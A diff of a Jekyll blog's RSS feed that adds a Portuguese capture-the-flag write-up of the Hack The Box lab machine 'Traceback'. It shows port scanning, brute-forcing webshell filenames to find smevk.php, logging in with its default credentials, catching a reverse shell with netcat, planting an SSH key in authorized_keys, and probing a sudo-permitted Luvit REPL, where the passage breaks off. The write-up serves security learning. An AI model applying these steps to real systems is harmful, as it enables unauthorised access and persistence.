@@ -3,19 +3,512 @@
   <channel>
     <title>Dark-Shellcode</title>
     <description></description>
-    <link>https://darkshellcode.github.io//</link>
-    <atom:link href="https://darkshellcode.github.io//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 06 Dec 2019 14:56:24 -0300</pubDate>
-    <lastBuildDate>Fri, 06 Dec 2019 14:56:24 -0300</lastBuildDate>
-    <generator>Jekyll v3.1.6</generator>
+    <link>http://localhost:4000//</link>
+    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 22 Aug 2020 17:36:16 -0300</pubDate>
+    <lastBuildDate>Sat, 22 Aug 2020 17:36:16 -0300</lastBuildDate>
+    <generator>Jekyll v3.8.6</generator>
     
       <item>
-        <title>Teste de poste writeup</title>
-        <description>&lt;h1 id=&quot;site-em-construção&quot;&gt;SITE EM CONSTRUÇÃO&lt;/h1&gt;
+        <title>Writeup Traceback</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/writeup/traceback/traceback.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Comecei realizando um scan de portas com nmap e descobri dois serviços um rodando SSH na porta 22 e um HTTP na porta 80 , o 13373 não aceita conexão.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.12s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE  SERVICE VERSION
+22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp    open   http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Help us
+13373/tcp closed unknown
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Acessando o site pelo navegador obtive a seguinte página.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/site.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Somente um texto de deface na página analisando o código fonte encontro um comentário.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/source.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Interessante um comentário sobre webshell, então provavelmente deve ter algum rodando no servidor, fui no google pesquisar por algum git com webshells para criar uma lista com nomes de webshell.&lt;/p&gt;
+
+&lt;p&gt;Pesquisando encontrei esse link https://github.com/TheBinitGhimire/Web-Shells clonei o respositório e fiz uma wordlist com os nomes dos arquivos.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;webshell.txt 
+13036
+1945.php
+529.php
+aa.php
+accept_language.php
+Ajax_PHP
+Ajax_PHP_Command_Shell.php
+AK-74
+alfa3.php
+alfav3.0.1.php
+andela.php
+angel.php
+etc..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Rodei um dirsearch no site e encontrei o nome da &lt;em&gt;webshell&lt;/em&gt; que estava rodando no servidor.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kali@kali]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirsearch &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.181 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; webshell.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; php
+
+ _|. _ _  _  _  _ _|_    v0.3.9
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_||| _&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_|| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 218
+
+Error Log: /home/corvo/.dirsearch/logs/errors-20-05-20_15-42-01.log
+
+Target: http://10.10.10.181
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:42:02] Starting: 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:42:10] 200 -    1KB - /smevk.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora com o nome da webshell &lt;strong&gt;smevk.php&lt;/strong&gt; basta acessar via navegador.&lt;/p&gt;
+
+&lt;p&gt;http://10.10.10.181/smevk.php
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/webshell.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Me deparei com uma página de login, então tentei o padrão admin:admin e logou com sucesso. ;)&lt;/p&gt;
+
+&lt;p&gt;Eu também poderia ter olhado no código fonte do arquivo para verificar com qual credenciais ele vem por padrão, claro isso desde que a pessoa que colocou a &lt;em&gt;webshell&lt;/em&gt; no site não tenha alterado a senha padrão.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /opt/Web-Shells/smevk.php 
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+&lt;span class=&quot;c1&quot;&gt;//Make your setting here.&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$deface_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://pastebin.com/raw.php?i=FHfxsFGT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//deface url here(pastebin).&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$UserName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                      &lt;span class=&quot;c1&quot;&gt;//Your UserName here.&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$auth_pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                  &lt;span class=&quot;c1&quot;&gt;//Your Password.&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#-------------------------------------------------------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Olhando o código fonte identificamos as credenciais admin:admin.&lt;/p&gt;
+
+&lt;p&gt;Agora logando com as credenciais.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/webshell-logado.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+A webshell é interessante e tem muitas funções, o print tem apenas uma parte para não ocupar muitos espaço.&lt;/p&gt;
+
+&lt;p&gt;Prefiro uma shell por linha de comando então faço uma reverse-shell para minha máquina usando um console da webshell que permite executar comando.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/python-shellrev.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+E no outro terminal com netcat temos nossa shell reversa logado como webadmin &lt;strong&gt;:)&lt;/strong&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listening on any address 4444 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb524&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Connection from 10.10.10.181:54362
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ whoami;id
+webadmin
+uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+$ uname -a
+Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Como a shell reverse que retorna não é lá essas coisas utilizo o python para dar uma melhorada.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+
+webadmin@traceback:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+webadmin@traceback:/var&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 48
+drwxr-xr-x 12 root root   4096 Aug 24  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 22 root root   4096 Aug 25  2019 ..
+drwxr-xr-x  3 root root   4096 Aug 25  2019 backups
+drwxr-xr-x 11 root root   4096 Aug 24  2019 cache
+drwxr-xr-x 37 root root   4096 Aug 24  2019 lib
+drwxrwsr-x  2 root staff  4096 Apr 24  2018 &lt;span class=&quot;nb&quot;&gt;local
+&lt;/span&gt;lrwxrwxrwx  1 root root      9 Aug 23  2019 lock -&amp;gt; /run/lock
+drwxrwxr-x  8 root syslog 4096 May 19 18:06 log
+drwxrwsr-x  2 root mail   4096 Feb  9  2019 mail
+drwxr-xr-x  2 root root   4096 Feb  9  2019 opt
+lrwxrwxrwx  1 root root      4 Aug 23  2019 run -&amp;gt; /run
+drwxr-xr-x  4 root root   4096 Aug 23  2019 spool
+drwxrwxrwt  2 root root   4096 May 19 19:48 tmp
+drwxr-xr-x  3 root root   4096 Aug 24  2019 www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora sim temos uma shell melhorzinha em bash. :)&lt;/p&gt;
+
+&lt;p&gt;Nesse ponto, agora com uma shell fui verificar quais usuarios tem no &lt;em&gt;/home&lt;/em&gt; e se encontrava algo interessante.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 16
+drwxr-xr-x  4 root     root     4096 Aug 25  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 22 root     root     4096 Aug 25  2019 ..
+drwxr-x---  5 sysadmin sysadmin 4096 May 19 19:41 sysadmin
+drwxr-x---  5 webadmin sysadmin 4096 May 19 19:44 webadmin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+O usuário &lt;em&gt;webadmin&lt;/em&gt; é um usuário com diretório &lt;em&gt;HOME&lt;/em&gt; no sistema então fui olhar para ver se encontrava algo.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:/home/webadmin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 64
+drwxr-x--- 5 webadmin sysadmin 4096 May 19 19:44 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 webadmin webadmin 3164 May 19 19:58 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
+drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
+drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 webadmin webadmin  807 Aug 23  2019 .profile
+drwxrwxr-x 2 webadmin webadmin 4096 May 19 19:21 .ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Temos o diretório .ssh isso é ótimo se ele permitir logar com uma chave publica nossa, assim teremos uma shell interativa perfeita 100% funcional para utilizar.&lt;/p&gt;
+
+&lt;p&gt;Gerei uma chave na minha máquina.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kali@kali]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen 
+Generating public/private rsa key pair.
+Enter file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;which to save the key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/home/corvo/.ssh/id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: corvo
+Enter passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
+Enter same passphrase again: 
+Your identification has been saved &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;corvo
+Your public key has been saved &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;corvo.pub
+The key fingerprint is:
+SHA256:GfgdGDFGdfgfdgdFdklKSdSAerTHfgJtxo corvo@kali
+The key&lt;span class=&quot;s1&quot;&gt;'s randomart image is:
++---[RSA 3072]----+
+|      . o... o .o|
+|       + +.o  + o|
+|      . = + =....|
+|       + ..=.+ o.|
+|      . S  o+ . o|
+|       . o..=.o..|
+|      E .+.+.* oo|
+|       o .+ ..+.=|
+|      . ..    .=+|
++----[SHA256]-----+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Com isso agora foi gerado duas chaves uma pública na qual enviarei para o servidor e irei adicionar no arquivo &lt;strong&gt;authorized_keys&lt;/strong&gt; localizado dentro de &lt;strong&gt;.ssh&lt;/strong&gt; e a privada que usarei para conectar no servidor sem senha.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kali@kali]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 108
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 corvo corvo  2602 mai 20 00:03 corvo
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 corvo corvo   573 mai 20 00:03 corvo.pub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+No servidor dentro do diretorio .ssh do &lt;strong&gt;webadmin&lt;/strong&gt; adiciono minha chave dentro do arquivo &lt;strong&gt;authorized_keys&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa ZZZcfEbmhksR/Glj+D-ABgQDAeLipsib1pLuyvRooI/zJIFyXxD/xiJPHeeFCOneuQ2igmHY2sGO5KrCFZzUxltz/j7+ylDsds+gjkUtlpfmg-gldff+g-f/1pyAj2MgB8Dx1CftI8KO0KzW5/q4kJUQhKrQ7jjeE27wZmZwmaVMG0Ci8dnLGhMDs6DBnl1kKUu0yrqftiw126JP8gYpm10COypPwgN/lHpfnDof/-gFghd+lMjisufgo71NKvqvfom1KW/AqP+6AVgLCtjOALOsVjd8/HlHK6zb+91qovrH58pVwAGWcVHKWK2w2Z4zVdefzimPXr+GnRQjOt65/hPHMW2hd287p+el6bK4vEvtGTdkshf9sf6ksbnf-sv+*HdlgQs/zUWR6HghKsRf*g/+LkKJkj+wvkcg9OQXWT/M5HC/kTGpnxH61SIdr9m0= corvo@kali&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora na minha máquina conecto no servidor via serviço &lt;em&gt;SSH&lt;/em&gt; sem precisar saber a senha do usuário &lt;strong&gt;webadmin&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kali@kali]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; corvo webadmin@10.10.10.181
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; OWNED BY XH4H  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
+- I guess stuff could have been configured better ^^ -
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+
+Welcome to Xh4H land 
+
+
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue May 19 19:49:00 2020 from 10.10.15.87
+
+
+webadmin@traceback:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Pronto acesso ssh realizado com sucessso :)&lt;/p&gt;
+
+&lt;p&gt;A flag de user.txt não se encontra dentro do diretório do &lt;em&gt;webadmin&lt;/em&gt; então ela só pode estar  dentro do &lt;em&gt;HOME&lt;/em&gt; do usuário sysadmin no qual não temos acesso (&lt;em&gt;AINDA&lt;/em&gt; rss), então teremos que conseguir acesso a sua conta.&lt;/p&gt;
+
+&lt;p&gt;Para isso primeiro verifico se através do sudo tenho alguma permissão especial para executar algum comando ou programa.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webadmin on traceback:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User webadmin may run the following commands on traceback:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sysadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /home/sysadmin/luvit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Legal permissão de executar um arquivo de nome &lt;strong&gt;luvit&lt;/strong&gt; que se encontra dentro do &lt;strong&gt;HOME&lt;/strong&gt; do sysadmin e roda com permissão de sysadmin, então explorando esse arquivo terei acesso a conta do &lt;em&gt;sysadmin&lt;/em&gt; e consiguirei pegar a flag.&lt;/p&gt;
+
+&lt;p&gt;Fazendo um teste de rodar o programa como sudo.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /home/sysadmin/luvit
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webadmin: 
+Sorry, try again.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Pediu senha que por sinal não tenho então não foi possível, como ele está setado para rodar como sysadmin então irei setar o usuário no comando sudo especificando que é para rodar como sysadmin.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sysadmin /home/sysadmin/luvit
+Welcome to the Luvit repl!
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Deu certo :)
+Ele cai em algum tipo de prompt &lt;strong&gt;&amp;gt;&lt;/strong&gt; ,  resolvi digitar &lt;em&gt;version()&lt;/em&gt; para ver o que ele retorna ou o que esse prompt faz, ou que ele espera como input.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; version&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;string &lt;span class=&quot;s2&quot;&gt;&quot;REPL&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:1: attempt to call global &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a nil value&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+stack traceback:
+	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;string &lt;span class=&quot;s2&quot;&gt;&quot;REPL&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:1: &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main chunk
+	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;C]: &lt;span class=&quot;k&quot;&gt;in function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'xpcall'&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;string &lt;span class=&quot;s2&quot;&gt;&quot;bundle:deps/repl.lua&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:97: &lt;span class=&quot;k&quot;&gt;in function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'evaluateLine'&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;string &lt;span class=&quot;s2&quot;&gt;&quot;bundle:deps/repl.lua&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:189: &lt;span class=&quot;k&quot;&gt;in function&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;string &lt;span class=&quot;s2&quot;&gt;&quot;bundle:deps/repl.lua&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:187&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
